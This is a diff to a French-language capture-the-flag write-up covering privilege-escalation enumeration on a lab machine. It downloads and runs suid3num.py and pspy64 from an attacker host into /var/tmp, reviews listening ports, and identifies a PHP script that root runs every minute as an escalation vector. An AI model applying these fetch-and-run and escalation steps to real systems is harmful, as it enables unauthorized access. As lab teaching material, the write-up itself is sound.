@@ -1029,10 +1029,14 @@ Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.p
 - les binaires SUID intéressants
 - leur présence éventuelle dans GTFOBins
 
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :
+> **Note**
+>  Comme tu le constates rapidement, les répertoires `/tmp` et `/dev/shm` sont nettoyés régulièrement sur cette machine.
+>  Tu utilises donc `/var/tmp`, accessible en lecture et en écriture par l’utilisateur `albert`, car il permet de conserver les fichiers plus longtemps.
+
+Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/var/tmp`) :
 
 ```bash
-cd /dev/shm
+cd /var/tmp
 wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
@@ -1102,22 +1106,68 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*                           
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -         
 ```
 
+Analyse :
 
+Plusieurs éléments intéressants apparaissent :
 
+- `22` → SSH (déjà utilisé pour la prise de pied)
+- `80` → service web accessible publiquement
+- `127.0.0.1:8080` → **service accessible uniquement en local**
 
+Ce dernier point attire particulièrement ton attention :
+
+- le service sur `127.0.0.1:8080` n’est **pas accessible depuis l’extérieur**
+- il pourrait exposer une interface interne ou une application sensible
+
+Conclusion :
+
+La présence d’un service local sur le port `8080` constitue une piste intéressante à explorer (via port forwarding par exemple).
 
 
 
 ### pspy64
 
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+Tu lances également `pspy64` dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
-cd /tmp
+Tu le télécharges et l’exécutes depuis un répertoire persistant (`/var/tmp`) :
+
+```bash
+cd /var/tmp
+wget http://10.10.16.93:8000/pspy64
+chmod +x pspy64
 ./pspy64
+```
 
-L’objectif est de repérer d’éventuelles tâches cron, scripts ou commandes exécutés automatiquement par root et qui pourraient être exploitables pour une escalade de privilèges.
+L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être explotées.
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+**Observation**
+
+Contrairement à une situation classique, `pspy64` met ici en évidence une activité intéressante :
+
+```bash
+CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
+```
+
+Ce script est exécuté régulièrement par root.
+
+**Analyse**
+
+Cette découverte est importante :
+
+- un script PHP est exécuté automatiquement par root
+- son emplacement est accessible (`/opt/website-monitor/`)
+- son exécution est récurrente (≈ chaque minute)
+
+Tu as donc identifié un vecteur potentiel d’escalade de privilèges :
+
+**un script exécuté par root que l’utilisateur peut potentiellement influencer**
+
+**Conclusion**
+
+Contrairement à de nombreux cas où `pspy64` ne révèle rien d’exploitable, il permet ici d’identifier un script exécuté automatiquement par root.
+
+Cette information devient le point de départ de l’exploitation.
+
 ### Conclusion de l’énumération manuelle
 
 ### Analyse avec linpeas.sh
